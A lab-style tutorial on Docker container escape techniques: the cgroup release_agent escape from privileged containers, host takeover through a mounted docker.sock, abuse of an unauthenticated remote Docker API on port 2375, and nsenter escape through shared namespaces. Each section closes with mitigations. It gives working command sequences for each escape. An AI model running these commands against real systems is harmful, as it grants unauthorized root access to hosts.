### **Understanding Linux Capabilities in Docker Containers**

Linux capabilities allow fine-grained control of root-level permissions assigned to processes or executables. Instead of granting full root privileges, capabilities let us assign specific permissions, such as modifying file ownership or loading kernel modules, to processes. This granular control is critical in containerized environments like Docker, where security and isolation are key concerns.

---

### **Docker Container Modes and Access Levels**

Docker containers can operate in two modes:

1. **User (Normal) Mode**:
   - Containers interact with the host OS via the Docker Engine.
   - Limited to specific permissions, ensuring minimal access to the host.

2. **Privileged Mode**:
   - Containers bypass the Docker Engine and directly interact with the host OS.
   - Grants full root-level access, increasing security risks.

In a typical scenario:
- Containers in **user mode** operate within the restrictions enforced by Docker.
- Containers in **privileged mode** have elevated permissions, making them capable of executing commands as root on the host.

---

### **Assessing Capabilities with `capsh`**

The `capsh` utility, part of the `libcap2-bin` package, can enumerate the capabilities granted to a container. For example:

```bash
capsh --print
```

Output might display:

```
Current: = cap_chown, cap_sys_module, cap_sys_chroot, cap_sys_admin, cap_setgid, cap_setuid
```

These capabilities represent permissions such as:
- `cap_chown`: Change file ownership.
- `cap_sys_admin`: Perform administrative tasks.
- `cap_sys_chroot`: Create or manipulate chroot environments.

By analyzing the available capabilities, attackers can determine potential exploitation vectors.

---

### **Exploiting Privileged Containers**

The following exploit demonstrates leveraging the `mount` syscall, enabled by `cap_sys_admin`, to execute code on the host.

#### **Exploit Steps:**

1. **Mount a cgroup**:
   - Create a temporary directory `/tmp/cgrp` and mount a control group (cgroup) into it:
     ```bash
     mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
     ```

2. **Enable Execution on Release**:
   - Configure the cgroup to execute commands when released:
     ```bash
     echo 1 > /tmp/cgrp/x/notify_on_release
     ```

3. **Locate the Host Path**:
   - Identify the host's filesystem path associated with the container:
     ```bash
     host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
     ```

4. **Set Release Agent**:
   - Define the command to execute upon cgroup release:
     ```bash
     echo "$host_path/exploit" > /tmp/cgrp/release_agent
     ```

5. **Craft the Exploit Script**:
   - Create a shell script to be executed:
     ```bash
     echo '#!/bin/sh' > /exploit
     echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
     chmod a+x /exploit
     ```

6. **Trigger Execution**:
   - Add a process to the cgroup, triggering the exploit:
     ```bash
     sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
     ```

---

### **Vulnerability Explanation**

1. **cgroup Mounting**:
   - cgroups allow resource and process management. Privileged containers can mount and manipulate cgroups to perform host-level actions.

2. **Notify on Release**:
   - Setting `notify_on_release` triggers kernel actions upon releasing a cgroup.

3. **Leveraging Host Path**:
   - By identifying the container's host path, the exploit enables access to host files.

4. **Release Agent Execution**:
   - The `release_agent` file specifies the script to execute, effectively injecting malicious code into the host.

---

### **Security Implications**

Running containers in privileged mode can expose hosts to severe vulnerabilities. Attackers can:
- Escalate privileges to root on the host.
- Access sensitive data on the host filesystem.
- Execute arbitrary commands or deploy backdoors.

**Best Practices**:
- Avoid running containers in privileged mode unless absolutely necessary.
- Minimize assigned capabilities with the `--cap-drop` and `--cap-add` Docker options.
- Regularly audit container configurations and capabilities.
### **Unix Sockets 101: A One-Size-Fits-All Guide**

#### **Understanding Unix Sockets**
Unix sockets are specialized endpoints for inter-process communication (IPC) that allow processes to exchange data efficiently. Unlike TCP/IP sockets, which rely on networking interfaces, Unix sockets operate through the filesystem. This makes them inherently faster for local communications, as they bypass the overhead associated with networking protocols.

#### **Key Features of Unix Sockets**:
1. **Speed**:
   - Unix sockets are faster than TCP/IP sockets for local communications. For example, Redis achieves high performance partly due to its use of Unix sockets.
   
2. **File System Permissions**:
   - Access to Unix sockets is governed by standard filesystem permissions, adding an extra layer of security by restricting who can interact with the socket.

---

### **How Docker Utilizes Unix Sockets**

Docker uses Unix sockets to facilitate communication with the Docker Engine. When you execute commands like `docker run`, they are sent to the Docker Engine through its socket file, typically named `docker.sock`.

#### **Key Details**:
- **Permissions**:
  - Access to `docker.sock` is limited to root or users in the `docker` group.
  - You can verify your permissions by checking group membership:
    ```bash
    groups
    ```
    Example output:
    ```
    cmnatic sudo docker
    ```

- **Location of `docker.sock`**:
  - The `docker.sock` file is commonly located at `/var/run/docker.sock`.
  - The exact path may vary depending on the OS or custom configurations.

---

### **Exploring and Exploiting the Docker Socket**

#### **Step 1: Confirm Access to Docker Commands**
- To exploit the Docker socket, ensure you have appropriate permissions (either as root or as a member of the `docker` group).

#### **Step 2: Locate `docker.sock` in a Container**
- Verify the presence of the socket:
  ```bash
  ls -la /var/run | grep sock
  ```
  Example output:
  ```
  srw-rw---- 1 root docker 0 Dec 9 19:37 docker.sock
  ```

#### **Step 3: Exploit the Docker Socket**
The Docker socket allows privileged operations, such as creating new containers. By exploiting it, you can access the host filesystem.

##### **Command Breakdown**:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

1. **Upload a Docker Image**:
   - Use a lightweight image like `alpine`. This ensures minimal size and reduces detection risk.

2. **Run the Container**:
   - Mount the host’s root filesystem (`/`) to `/mnt` in the container:
     ```bash
     docker run -v /:/mnt
     ```

3. **Interactive Mode**:
   - Run the container interactively with `-it`, allowing you to execute commands within it.

4. **Change the Root Directory**:
   - Use `chroot` to change the container’s root directory to `/mnt` (the mounted host filesystem):
     ```bash
     chroot /mnt
     ```

5. **Launch a Shell**:
   - Open a shell within the new root context to execute commands:
     ```bash
     sh
     ```

---

### **Verifying Success**

1. **Access the Host Filesystem**:
   - After executing the exploit, you’ll find yourself inside a new container.
   - Run `ls /` to list the contents of the host filesystem:
     ```bash
     root@alpine-container:~# ls /
     ```
     Example output:
     ```
     bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
     boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swapfile  tmp  var
     ```

2. **Host Filesystem Access**:
   - The above confirms that the host filesystem is accessible via `/mnt` in the container.

---

### **Implications and Security Considerations**

#### **Why is this Dangerous?**
1. **Host-Level Control**:
   - An attacker can modify the host filesystem, extract sensitive data, or install backdoors.

2. **Privilege Escalation**:
   - Gaining access to `docker.sock` effectively grants root privileges on the host.

#### **Mitigation Strategies**:
1. **Restrict Access to `docker.sock`**:
   - Limit membership in the `docker` group to trusted users only.
   
2. **Use Namespaces**:
   - Enable user namespaces to isolate container privileges.

3. **Monitor and Audit**:
   - Regularly audit Docker configurations and monitor access to `docker.sock`.

4. **Avoid Mounting Sensitive Resources**:
   - Refrain from mounting `docker.sock` in containers unless absolutely necessary.

By understanding and securing Unix sockets, especially in Docker environments, you can mitigate significant security risks while enabling efficient inter-process communication.
### **The Docker Engine - TCP Sockets Edition**

#### **Introduction to Docker TCP Sockets**
In addition to Unix sockets, the Docker Engine can also use **TCP sockets** for remote administration. This allows tools like Portainer or Jenkins to manage Docker containers over the network, automating deployment and management tasks.

However, exposing the Docker Engine to TCP sockets introduces significant security risks if not configured properly. If the Docker API is left unprotected, an attacker can gain remote access to the Docker daemon and execute arbitrary commands.

---

### **The Vulnerability: Insecure Remote Docker Access**

1. **Default Port**:  
   The Docker API, when configured for remote access, listens on port **2375** (unsecured HTTP) or **2376** (secured HTTPS). If left open and unprotected, it allows anyone on the network to interact with the Docker daemon.
   
2. **Unsecured Access**:  
   An exposed Docker API over HTTP (port 2375) provides no authentication, enabling attackers to:
   - Enumerate containers, images, and networks.
   - Start or stop containers.
   - Mount filesystems.
   - Deploy their own malicious containers.

---

### **Step 1: Enumerating Docker's Remote Accessibility**

#### **Using Nmap to Detect an Open Docker Port**
Run an Nmap scan on the target IP:
```bash
nmap -sV -p 2375 10.10.74.174
```

Example Output:
```
PORT    STATE SERVICE VERSION
2375/tcp open  docker Docker 20.10.20 (API 1.41)
```

The result confirms that the Docker API is accessible on port 2375.

---

### **Step 2: Confirming Access to the Docker API**

#### **Using Curl to Interact with the API**
You can verify API access using the `curl` command:
```bash
curl http://10.10.74.174:2375/version
```

Example Output:
```json
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "20.10.20",
      "Details": {
        "ApiVersion": "1.41",
        "Arch": "amd64",
        "BuildTime": "2022-10-18T18:18:12.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "03df974",
        "GoVersion": "go1.18.7",
        "KernelVersion": "5.15.0-1022-aws",
        "MinAPIVersion": "1.12",
        "Os": "linux"
      }
    }
  ]
}
```

This confirms that the API is open and accessible.

---

### **Step 3: Executing Docker Commands on the Target**

#### **Listing Running Containers**
Use the `docker` CLI with the `-H` flag to connect to the target:
```bash
docker -H tcp://10.10.74.174:2375 ps
```

Example Output:
```
CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS         PORTS                               NAMES
b4ec8c45414c   dockertest   "/usr/sbin/sshd -D"   10 hours ago   Up 7 minutes   0.0.0.0:22->22/tcp, :::22->22/tcp   priceless_mirzakhani
```

This output lists all running containers, their images, ports, and names.

---

### **Step 4: Exploiting the Remote Docker API**

Once confirmed, you can execute various Docker commands on the target.

#### **Examples**:

1. **List Docker Networks**:
   ```bash
   docker -H tcp://10.10.74.174:2375 network ls
   ```
   - Discover networks to identify potential pivot points.

2. **List Docker Images**:
   ```bash
   docker -H tcp://10.10.74.174:2375 images
   ```
   - View container images for reverse-engineering or data extraction.

3. **Execute a Command on a Running Container**:
   ```bash
   docker -H tcp://10.10.74.174:2375 exec -it <container_id> /bin/sh
   ```
   - Access a shell on a running container.

4. **Start a New Container**:
   Deploy a new container to perform malicious actions:
   ```bash
   docker -H tcp://10.10.74.174:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```

---

### **Mitigation Strategies**

#### **1. Secure the Docker API**
- Use **HTTPS (port 2376)** instead of HTTP.
- Configure TLS certificates to authenticate and encrypt API access.

#### **2. Restrict Network Access**
- Bind the Docker daemon to localhost (`127.0.0.1`) instead of all interfaces (`0.0.0.0`).
- Use firewalls to restrict access to trusted IPs.

#### **3. Require Authentication**
- Use tools like **Docker Swarm** or **Kubernetes** to enforce stricter access controls.

#### **4. Regularly Audit Exposures**
- Use tools like Nmap or vulnerability scanners to identify open Docker ports.
- Periodically review configurations for unnecessary exposure.

---

By understanding and securing remote Docker API access, organizations can prevent unauthorized access and mitigate potential threats to their infrastructure.

### **Understanding Namespaces in Linux and Docker**

Namespaces in Linux are a foundational feature that enables process isolation. They segregate system resources such as processes, memory, filesystems, and network interfaces into separate "views," ensuring that processes in one namespace cannot directly interact with processes or resources in another.

This is the core mechanism enabling containerization tools like Docker to isolate applications from the host system and each other.

---

### **Key Concepts of Namespaces**
1. **Namespace and PID**:
   - Each process belongs to a namespace and is identified by a **Process Identifier (PID)**.
   - Processes in one namespace can only see and interact with other processes within the same namespace.

2. **Containerization Example**:
   - A Docker container runs in its namespace, appearing as if it is the only system process running. The host OS might have hundreds of processes, but the container might only have a few (e.g., the processes required to run its specific application).

---

### **Demonstrating Namespaces**

#### **Processes on the Host**
A typical host system might have hundreds of processes:
```bash
ps aux
```
Example snippet:
```
cmnatic     1984  0.0  0.7 493400 28932 ?        Sl   00:48   0:00 update-notifier
cmnatic     2263  5.6 10.0 3385096 396960 ?      Sl   00:48   0:08 /snap/firefox/1232/usr/lib/firefox/firefox
...
```

#### **Processes in a Docker Container**
Inside a container:
```bash
ps aux
```
Example snippet:
```
root           1  0.2  0.2 166612 11356 ?        Ss   00:47   0:00 /sbin/init
root          14  0.1  0.1 6520  5212 ?         S    00:47   0:00 /usr/sbin/apache2 -D FOREGROUND
www-data      15  0.1  0.1 1211168 4112 ?       S    00:47   0:00 /usr/sbin/apache2 -D FOREGROUND
```
- Only a handful of processes run, typically limited to the container's application and supporting processes.
- The **PID 1** process is crucial; it's the ancestor for all processes in the container. If it stops, the container stops.

---

### **Exploiting Namespace Sharing**

Under certain conditions, a container may share namespaces with the host, either intentionally (for debugging) or due to misconfiguration. This allows a container to interact directly with the host's processes, exposing significant vulnerabilities.

#### **Indicators of Namespace Sharing**
If you list processes in a container and see host processes:
```bash
ps aux
```
Example:
```
root           1  0.1  0.5 102796 11372 ?        Ss   11:40   0:03 /sbin/init
root           2  0.0  0.0      0     0 ?        S    11:40   0:00 [kthreadd]
root        2119  0.0  0.1 1148348 3372 ?        Sl   12:00   0:00 /usr/bin/docker-proxy ...
```
This indicates that the container can potentially interact with the host's processes.

---

### **Exploiting Namespace Sharing with `nsenter`**

`nsenter` allows you to execute commands within the namespace of another process, effectively bypassing container isolation.

#### **Exploit Command**
```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

#### **Breaking Down the Command**
1. **`--target 1`**:
   - Targets the **PID 1** process (typically `/sbin/init` or `systemd` on the host).
   - Grants access to the namespaces of this critical host process.

2. **Namespace Options**:
   - `--mount`: Accesses the mount namespace of the target process, providing access to host filesystems.
   - `--uts`: Shares the same hostname as the target process.
   - `--ipc`: Allows access to shared memory and semaphores.
   - `--net`: Shares the network namespace, enabling interaction with network interfaces.

3. **Shell Execution**:
   - Executes a shell (`/bin/bash`) within the target process's namespaces.

#### **Example Exploit Steps**
1. Run the exploit in the container:
   ```bash
   nsenter --target 1 --mount --uts --ipc --net /bin/bash
   ```
2. Verify you're on the host:
   ```bash
   hostname
   ```
   Example output:
   ```
   thm-docker-host
   ```

3. Explore the host filesystem:
   ```bash
   ls /
   ```

---

### **Security Implications and Mitigation**

#### **Why is Namespace Sharing Dangerous?**
- Containers can directly interact with the host, bypassing isolation.
- Attackers can access host filesystems, processes, and network interfaces.
- Privilege escalation to root is straightforward.

#### **Mitigation Strategies**
1. **Avoid Namespace Sharing**:
   - Do not share host namespaces with containers unless absolutely necessary.

2. **Use Namespace Isolation**:
   - Use Docker's `--userns-remap` feature to enable user namespace isolation.

3. **Minimize Privileges**:
   - Avoid running containers as root.
   - Drop unnecessary capabilities using `--cap-drop`.

4. **Audit Container Configurations**:
   - Regularly inspect Docker configurations for misconfigurations or excessive privileges.

5. **Monitor and Restrict `nsenter`**:
   - Restrict access to tools like `nsenter` that can manipulate namespaces.

---

By understanding namespaces and their vulnerabilities, you can better secure containerized environments against potential exploits.
